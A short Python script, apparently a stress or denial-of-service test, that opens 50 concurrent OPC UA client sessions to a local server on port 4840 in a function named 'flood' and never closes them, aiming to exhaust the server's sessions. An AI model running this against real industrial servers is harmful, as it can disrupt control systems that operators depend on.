from opcua import Client
import threading

def flood():
    c = Client("opc.tcp://localhost:4840")
    try:
        c.connect()
        print("Connected session")
    except Exception as e:
        print("Connection failed:", e)

threads = []
for _ in range(50):
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)
